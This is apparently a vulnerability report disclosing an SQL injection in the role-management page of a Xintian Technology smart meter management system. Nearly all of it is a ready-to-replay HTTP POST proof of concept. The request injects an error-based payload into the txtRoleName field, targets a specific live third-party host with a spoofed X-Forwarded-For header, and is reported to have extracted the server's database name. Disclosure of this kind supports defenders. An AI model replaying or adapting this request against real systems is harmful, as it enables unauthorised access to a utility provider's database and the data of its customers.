SQL injection vulnerability exists in the smart table integrated management system of Xintian Technology Co., LTD

official website:https://www.suntront.com/

verison:Ver5.6.9

Loophole file: / / SysManage AddUpdateRole. Aspx

Vulnerability parameter: txtRoleName

POC
```
POC
POST /SysManage/AddUpdateRole.aspx HTTP/1.1
Host: pay.gtswjt.com:10001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 763
Origin: http://pay.gtswjt.com:10001
Connection: close
Referer: http://pay.gtswjt.com:10001/SysManage/AddUpdateRole.aspx
Cookie: 
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

__LASTFOCUS=&__VIEWSTATE=SfVnjbEBer5WV3uPNII7yl%2FeDSCOs6TNGH9bS6scS3gUhGokqER9q7RhHsHmD4QOuzAZVHgUL7d2dTPqlTTiRnwYEjMJxl%2F%2BibmKelDEuT4n%2FnMkhYoGb8Y%2B4b1t%2BjVrZtfSFFPUIOYhejR8RYwpK13i694CviSYMfbb39jIpiEvX07xlBeDyhdSUVWs%2FpNLrUzfzf11qaMVoL0u&__VIEWSTATEGENERATOR=7CD9219B&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=NWPhrpN0buUJNs3bCgOo1a8sHescROHA%2FXNfeEjx4lsQg5D2uCYkiCXgkz1nizgl5l6cfhj8Q%2BroQUz7I4y0iO%2Bd%2FSLx7%2FYKo9cUFhzL6Xpz%2BnDCMF9GWPBt%2BlJRk317JZRUbJeSULOt7eyim9N7ZDST2UYBxCjyYBEf9OrQ9W7nRnc5imHcEtyw9zaurztJqJfS9gZFWVjoWro%2BjXDIvouDYsz49JgITm4L3RGRMGzffs0Xh5Q0lrf3KFDc1s99hN6GmslySpUuFmqG1fIyAq9XOiAOCX8IW935cPUIobIXtenYk9Y40kAfVEc%3D&txtRoleName=2' and 1=convert(int,db_name()) and '1'='1&ddlPriority=1&TbxRemark=&btnSave=%B1%A3%B4%E6
```

Click jump, error to get the database name

![WPS图片(3)](https://github.com/wpay65249519/cve/assets/142558438/7602cebf-30e8-4a77-8120-20e37663f4d2)

The database name is SunWirelessDB

![WPS图片(4)](https://github.com/wpay65249519/cve/assets/142558438/31acff5b-ad25-4dca-a1c1-f582adf0dfe3)
